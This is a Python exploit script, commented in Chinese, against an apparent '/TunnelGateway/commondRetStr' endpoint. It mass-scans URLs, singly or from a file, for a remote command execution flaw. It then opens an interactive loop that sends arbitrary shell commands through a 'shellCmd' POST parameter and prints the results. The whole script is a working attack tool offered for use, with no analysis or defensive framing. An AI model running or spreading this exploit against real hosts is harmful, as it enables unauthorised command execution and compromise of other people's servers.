import argparse
import sys
import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help='输入需要验证的URL', default='')
parser.add_argument('-f', '--file', help='输入需要批量验证的文件名', default='')
parser.add_argument('-c', '--create_account', help="输入需要执行的代码URL", default='')
args = parser.parse_args()
urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "11"
}
path = '/TunnelGateway/commondRetStr'


## 创建check 函数
def check(url):
    data = " "
    try:
        return_data = requests.post(url=url + path, headers=headers, verify=False, data=data, timeout=3)
        if 'success' in return_data.text and return_data.status_code == 200:
            print("[+] 漏洞存在！！！ 返回状态为200且返回数据中包含success字符" + "[✅ ] 当前URL为：" + url)
        else:
            print("[-] 漏洞不存在！！！")
    except Exception as e:
        print("出现异常，请手工利用")


# ## 定义more 函数用于读取文件
def more(file):
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)


def exp(url):
    while 1:
        cmd = str(input("执行命令:"))
        if cmd == "exit":
            sys.exit(0)
        else:
            data = "shellCmd=" + cmd
            try:
                return_data = requests.post(url=url + path, headers=headers, verify=False, data=data)
                if return_data.status_code == 200:
                    print(return_data.text)
                else:
                    print("返回失败")
            except Exception as e:
                print("代码输入出现异常")




if __name__ == '__main__':
    if args.url != '' and args.file == '' and args.create_account == '':
        check(args.url)
    if args.url == '' and args.file != '' and args.create_account == '':
        more(args.file)
    if args.url == '' and args.file == '' and args.create_account != '':
        exp(args.create_account)
